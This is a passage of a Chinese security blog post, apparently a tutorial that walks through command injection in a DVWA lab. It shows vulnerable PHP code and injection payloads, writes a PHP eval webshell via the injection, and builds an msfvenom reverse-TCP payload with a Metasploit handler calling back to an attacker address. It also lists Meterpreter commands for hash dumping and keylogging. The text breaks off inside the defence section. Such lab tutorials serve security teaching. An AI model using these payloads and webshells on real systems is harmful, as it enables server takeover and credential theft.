@@ -1,0 +1,1034 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="bae">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="命令执行漏洞详解🎯 前言命令执行漏洞是Web安全领域中的一种高危漏洞，它允许攻击者在目标服务器上执行任意系统命令。本文将深入解析命令执行漏洞的原理、成因、利用方法以及防护策略，并通过DVWA靶场环境进行实战演示。  📋 目录 漏洞概述 漏洞原理 环境搭建 漏洞利用实战 后渗透操作 防护措施 总结   🔍 漏洞概述什么是命令执行漏洞？命令执行漏洞（Command Execution&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行漏洞">
+<meta property="og:url" content="https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="bae的博客">
+<meta property="og:description" content="命令执行漏洞详解🎯 前言命令执行漏洞是Web安全领域中的一种高危漏洞，它允许攻击者在目标服务器上执行任意系统命令。本文将深入解析命令执行漏洞的原理、成因、利用方法以及防护策略，并通过DVWA靶场环境进行实战演示。  📋 目录 漏洞概述 漏洞原理 环境搭建 漏洞利用实战 后渗透操作 防护措施 总结   🔍 漏洞概述什么是命令执行漏洞？命令执行漏洞（Command Execution&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bae-ace.github.io/img/tools1.jpg">
+<meta property="article:published_time" content="2025-07-26T10:53:13.000Z">
+<meta property="article:modified_time" content="2025-07-26T11:08:24.951Z">
+<meta property="article:author" content="bae">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="漏洞利用">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://bae-ace.github.io/img/tools1.jpg">
+  
+  
+  
+  <title>命令执行漏洞 - bae的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"bae-ace.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"CHbSLmwKFof8sHkOvlnoDfza-MdYXbMMI","app_key":"lVqIfnWUAiZZLIag2RoSpxoo","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-07-19T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>bae&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-books"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-book"></i>
+                <span>文档</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hexo.fluid-dev.com/" target="_self">
+                    
+                    <span>主题博客</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hexo.fluid-dev.com/docs/guide/" target="_self">
+                    
+                    <span>配置指南</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hexo.fluid-dev.com/docs/icon/" target="_self">
+                    
+                    <span>图标用法</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/AI%E9%A3%8E%E6%99%AF.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="命令执行漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        bae
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-26 18:53" pubdate>
+           2025 年 07 月 26 日 , 晚上 06:53 , 星期六
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span>次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">命令执行漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="命令执行漏洞详解"><a href="#命令执行漏洞详解" class="headerlink" title="命令执行漏洞详解"></a>命令执行漏洞详解</h1><h2 id="🎯-前言"><a href="#🎯-前言" class="headerlink" title="🎯 前言"></a>🎯 前言</h2><p>命令执行漏洞是Web安全领域中的一种高危漏洞，它允许攻击者在目标服务器上执行任意系统命令。本文将深入解析命令执行漏洞的原理、成因、利用方法以及防护策略，并通过DVWA靶场环境进行实战演示。</p>
+<hr>
+<h2 id="📋-目录"><a href="#📋-目录" class="headerlink" title="📋 目录"></a>📋 目录</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0">漏洞概述</a></li>
+<li><a target="_blank" rel="noopener" href="https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li>
+<li><a target="_blank" rel="noopener" href="https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
+<li><a target="_blank" rel="noopener" href="https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98">漏洞利用实战</a></li>
+<li><a target="_blank" rel="noopener" href="https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C">后渗透操作</a></li>
+<li><a target="_blank" rel="noopener" href="https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD">防护措施</a></li>
+<li><a target="_blank" rel="noopener" href="https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%80%BB%E7%BB%93">总结</a></li>
+</ol>
+<hr>
+<h2 id="🔍-漏洞概述"><a href="#🔍-漏洞概述" class="headerlink" title="🔍 漏洞概述"></a>🔍 漏洞概述</h2><h3 id="什么是命令执行漏洞？"><a href="#什么是命令执行漏洞？" class="headerlink" title="什么是命令执行漏洞？"></a>什么是命令执行漏洞？</h3><p>命令执行漏洞（Command Execution&#x2F;Command Injection）是指当Web应用程序需要调用系统命令来完成某些功能时，由于对用户输入的过滤不严格，导致攻击者可以构造恶意的命令参数，从而在服务器上执行任意系统命令的安全漏洞。</p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ul>
+<li><strong>服务器完全控制</strong>：获得服务器的命令执行权限</li>
+<li><strong>数据泄露</strong>：访问敏感文件和数据库信息</li>
+<li><strong>权限提升</strong>：通过系统漏洞进一步提升权限</li>
+<li><strong>横向移动</strong>：以被攻陷服务器为跳板攻击内网其他系统</li>
+<li><strong>恶意软件植入</strong>：上传后门程序或恶意软件</li>
+</ul>
+<hr>
+<h2 id="⚙️-漏洞原理"><a href="#⚙️-漏洞原理" class="headerlink" title="⚙️ 漏洞原理"></a>⚙️ 漏洞原理</h2><h3 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h3><p>命令执行漏洞的根本原因在于应用程序直接将用户输入作为系统命令的参数，而没有进行适当的过滤和验证。</p>
+<h4 id="典型的脆弱代码示例："><a href="#典型的脆弱代码示例：" class="headerlink" title="典型的脆弱代码示例："></a>典型的脆弱代码示例：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 获取用户输入的IP地址</span><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-comment">// 直接将用户输入拼接到系统命令中</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span> . <span class="hljs-variable">$target</span>);<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$cmd</span>&lt;/pre&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h3><p>攻击者通常利用以下命令连接符来注入恶意命令：</p>
+<table>
+<thead>
+<tr>
+<th>连接符</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td>命令分隔符</td>
+<td><code>127.0.0.1; whoami</code></td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>逻辑与，前一个命令成功后执行后一个</td>
+<td><code>127.0.0.1 &amp;&amp; whoami</code></td>
+</tr>
+<tr>
+<td>&#96;</td>
+<td></td>
+<td>&#96;</td>
+</tr>
+<tr>
+<td>&#96;</td>
+<td>&#96;</td>
+<td>管道符，将前一个命令的输出作为后一个命令的输入</td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>后台执行</td>
+<td><code>127.0.0.1 &amp; whoami</code></td>
+</tr>
+<tr>
+<td><code>$()</code></td>
+<td>命令替换</td>
+<td><code>127.0.0.1$(whoami)</code></td>
+</tr>
+<tr>
+<td><code> </code></td>
+<td>反引号命令替换</td>
+<td><code>127.0.0.1</code>whoami<code> </code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="🌐-环境搭建"><a href="#🌐-环境搭建" class="headerlink" title="🌐 环境搭建"></a>🌐 环境搭建</h2><h3 id="靶场环境配置"><a href="#靶场环境配置" class="headerlink" title="靶场环境配置"></a>靶场环境配置</h3><p><strong>系统环境：</strong></p>
+<ul>
+<li>操作系统：Windows 7</li>
+<li>Web服务器：PHPStudy</li>
+<li>靶场程序：DVWA</li>
+<li>DVWA路径：<code>C:\download\phpstudy\phpstudy_pro\WWW\DVWA</code></li>
+<li>访问地址：<code>http://192.168.147.136/DVWA/</code></li>
+</ul>
+<h3 id="环境准备步骤"><a href="#环境准备步骤" class="headerlink" title="环境准备步骤"></a>环境准备步骤</h3><ol>
+<li><strong>安装PHPStudy</strong><ul>
+<li>下载并安装PHPStudy集成环境</li>
+<li>启动Apache和MySQL服务</li>
+</ul>
+</li>
+<li><strong>部署DVWA</strong><ul>
+<li>下载DVWA源码</li>
+<li>解压到PHPStudy的WWW目录</li>
+<li>配置数据库连接</li>
+</ul>
+</li>
+<li><strong>设置安全等级</strong><ul>
+<li>登录DVWA管理界面</li>
+<li>导航至DVWA Security</li>
+<li>将安全等级设置为Low</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="💥-漏洞利用实战"><a href="#💥-漏洞利用实战" class="headerlink" title="💥 漏洞利用实战"></a>💥 漏洞利用实战</h2><h3 id="第一步：访问漏洞页面"><a href="#第一步：访问漏洞页面" class="headerlink" title="第一步：访问漏洞页面"></a>第一步：访问漏洞页面</h3><p>打开浏览器访问命令执行漏洞测试页面：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">147.136</span><span class="hljs-regexp">/DVWA/</span>vulnerabilities<span class="hljs-regexp">/exec/</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="第二步：基础命令注入测试"><a href="#第二步：基础命令注入测试" class="headerlink" title="第二步：基础命令注入测试"></a>第二步：基础命令注入测试</h3><p>在输入框中输入以下Payload进行测试：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> &amp;&amp; whoami<br></code></pre></td></tr></table></figure>
+
+<p><strong>预期结果：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> 127.0.0.1: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=64 <span class="hljs-attribute">time</span>=0.042 ms<br><span class="hljs-built_in">..</span>.<br><br>nt authority\system<br></code></pre></td></tr></table></figure>
+
+<p>如果看到<code>nt authority\system</code>输出，说明命令注入成功！</p>
+<h3 id="第三步：信息收集"><a href="#第三步：信息收集" class="headerlink" title="第三步：信息收集"></a>第三步：信息收集</h3><p>使用不同的命令收集系统信息：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># 查看当前用户</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &amp;&amp; whoami<br><br><span class="hljs-comment"># 查看系统信息</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &amp;&amp; systeminfo<br><br><span class="hljs-comment"># 查看网络配置</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &amp;&amp; ipconfig<br><br><span class="hljs-comment"># 查看当前目录</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &amp;&amp; dir<br><br><span class="hljs-comment"># 查看进程列表</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &amp;&amp; tasklist<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="🎯-后渗透操作"><a href="#🎯-后渗透操作" class="headerlink" title="🎯 后渗透操作"></a>🎯 后渗透操作</h2><h3 id="方法一：上传Webshell"><a href="#方法一：上传Webshell" class="headerlink" title="方法一：上传Webshell"></a>方法一：上传Webshell</h3><h4 id="1-准备一句话木马"><a href="#1-准备一句话木马" class="headerlink" title="1. 准备一句话木马"></a>1. 准备一句话木马</h4><p>创建<code>shell.php</code>文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>或者使用Base64编码版本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-通过命令注入上传"><a href="#2-通过命令注入上传" class="headerlink" title="2. 通过命令注入上传"></a>2. 通过命令注入上传</h4><p>使用echo命令写入一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &amp;&amp; <span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]); ?^&gt; &gt; C:\download\phpstudy\phpstudy_pro\WWW\DVWA\shell.php<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意事项：</strong></p>
+<ul>
+<li><code>^</code>符号是Windows cmd的转义符</li>
+<li><code>&gt;</code>符号用于重定向输出到文件</li>
+<li>路径必须是Web目录下可访问的位置</li>
+</ul>
+<h4 id="3-验证上传成功"><a href="#3-验证上传成功" class="headerlink" title="3. 验证上传成功"></a>3. 验证上传成功</h4><p>访问上传的木马文件：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">147.136</span><span class="hljs-regexp">/DVWA/</span>shell.php<br></code></pre></td></tr></table></figure>
+
+<p>如果页面显示空白，说明PHP文件上传成功。</p>
+<h3 id="方法二：使用蚁剑连接"><a href="#方法二：使用蚁剑连接" class="headerlink" title="方法二：使用蚁剑连接"></a>方法二：使用蚁剑连接</h3><h4 id="1-配置蚁剑连接"><a href="#1-配置蚁剑连接" class="headerlink" title="1. 配置蚁剑连接"></a>1. 配置蚁剑连接</h4><p><strong>连接参数：</strong></p>
+<ul>
+<li>URL: <code>http://192.168.147.136/DVWA/shell.php</code></li>
+<li>密码: <code>pass</code></li>
+<li>编码: <code>UTF-8</code></li>
+<li>类型: <code>PHP</code></li>
+</ul>
+<h4 id="2-功能演示"><a href="#2-功能演示" class="headerlink" title="2. 功能演示"></a>2. 功能演示</h4><p>通过蚁剑可以实现：</p>
+<ul>
+<li>文件管理：浏览、上传、下载、编辑文件</li>
+<li>数据库管理：连接和操作数据库</li>
+<li>虚拟终端：执行系统命令</li>
+<li>反向代理：建立隧道连接</li>
+</ul>
+<h3 id="方法三：MSF提权操作"><a href="#方法三：MSF提权操作" class="headerlink" title="方法三：MSF提权操作"></a>方法三：MSF提权操作</h3><h4 id="1-生成Meterpreter木马"><a href="#1-生成Meterpreter木马" class="headerlink" title="1. 生成Meterpreter木马"></a>1. 生成Meterpreter木马</h4><p>在Kali Linux中执行：</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zsh">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure>
+
+<p><strong>参数说明：</strong></p>
+<ul>
+<li><code>-p</code>: 指定Payload类型</li>
+<li><code>LHOST</code>: 攻击者IP地址</li>
+<li><code>LPORT</code>: 监听端口</li>
+<li><code>-f</code>: 输出格式</li>
+</ul>
+<h4 id="2-上传木马文件"><a href="#2-上传木马文件" class="headerlink" title="2. 上传木马文件"></a>2. 上传木马文件</h4><p>通过蚁剑将生成的<code>shell.exe</code>上传到目标服务器：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">C:\Users\Public\<span class="hljs-keyword">shell</span>.exe<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-配置MSF监听器"><a href="#3-配置MSF监听器" class="headerlink" title="3. 配置MSF监听器"></a>3. 配置MSF监听器</h4><p>启动Metasploit：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br></code></pre></td></tr></table></figure>
+
+<p>配置监听器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.147.129<br><span class="hljs-built_in">set</span> lport 4444<br>exploit<br></code></pre></td></tr></table></figure>
+
+<h4 id="4-执行木马获取Meterpreter会话"><a href="#4-执行木马获取Meterpreter会话" class="headerlink" title="4. 执行木马获取Meterpreter会话"></a>4. 执行木马获取Meterpreter会话</h4><p>在蚁剑终端或通过命令注入执行：</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">C:</span>\Users\<span class="hljs-keyword">Public</span>\shell.exe<br></code></pre></td></tr></table></figure>
+
+<p>成功建立连接后，可以使用Meterpreter的强大功能：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">获取系统信息</span><br>sysinfo<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取用户权限</span><br>getuid<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">提权到SYSTEM</span><br>getsystem<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取密码哈希</span><br>hashdump<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">截屏</span><br>screenshot<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">键盘记录</span><br>keyscan_start<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="🛡️-防护措施"><a href="#🛡️-防护措施" class="headerlink" title="🛡️ 防护措施"></a>🛡️ 防护措施</h2><h3 id="输入验证和过滤"><a href="#输入验证和过滤" class="headerlink" title="输入验证和过滤"></a>输入验证和过滤</h3><h4 id="1-白名单验证"><a href="#1-白名单验证" class="headerlink" title="1. 白名单验证"></a>1. 白名单验证</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validateIP</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>) </span>&#123;<br>    <span class="hljs-comment">// 使用白名单验证IP地址格式</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span 